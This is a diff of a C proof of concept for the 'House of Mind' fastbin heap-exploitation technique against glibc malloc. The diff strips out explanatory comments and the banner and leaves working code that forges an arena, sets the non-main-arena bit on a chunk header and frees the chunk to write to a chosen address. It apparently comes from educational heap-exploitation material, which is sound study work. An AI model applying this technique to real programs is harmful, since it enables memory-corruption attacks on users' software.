@@ -50,13 +50,9 @@ By controlling the memory at the `HEAP_MAX_SIZE` aligned boundary, an attacker c
 #include <assert.h>
 
 int main(){
-	printf("House of Mind - Fastbin Variant\n");
-	
-	// Values for the allocation information.	
 	int HEAP_MAX_SIZE = 0x4000000;
 	int MAX_SIZE = (128*1024) - 0x100;
 
-	// The target location of our attack and the fake arena to use
 	uint8_t* fake_arena = malloc(0x1000); 
 	uint8_t* target_loc = fake_arena + 0x30;
 	uint8_t* target_chunk = (uint8_t*) fake_arena - 0x10;
@@ -66,7 +62,7 @@ int main(){
 	fake_arena[0x889] = 0xFF; 
 	fake_arena[0x88a] = 0xFF; 
 
-	// Calculate the location where the fake heap_info must reside
+	// Calculate fake heap_info location
 	uint64_t new_arena_value = (((uint64_t) target_chunk) + HEAP_MAX_SIZE) & ~(HEAP_MAX_SIZE - 1);
 	uint64_t* fake_heap_info = (uint64_t*) new_arena_value;
 
@@ -77,8 +73,7 @@ int main(){
 		user_mem = malloc(MAX_SIZE);
 	}
 
-	// Create victim chunk
-	uint64_t* fastbin_chunk = malloc(0x50); // Size 0x60
+	uint64_t* fastbin_chunk = malloc(0x50); 
 	uint64_t* chunk_ptr = fastbin_chunk - 2;
 
 	// Fill TCache
@@ -86,16 +81,14 @@ int main(){
 	for(int i = 0; i < 7; i++) tcache_chunks[i] = malloc(0x50);
 	for(int i = 0; i < 7; i++) free(tcache_chunks[i]);
 
-	// Setup fake heap_info to point to our fake arena
+	// Link fake arena in heap_info
 	fake_heap_info[0] = (uint64_t) fake_arena;
 
 	// VULNERABILITY: Set non-main arena bit
 	chunk_ptr[1] = 0x60 | 0x4; 
 
-	// Trigger: free the chunk
 	free(fastbin_chunk);
 
-	// The address of 'fastbin_chunk' has been written to fake_arena->fastbinsY[offset]
 	assert(*((unsigned long *) (target_loc)) != 0);
 	return 0;
 }
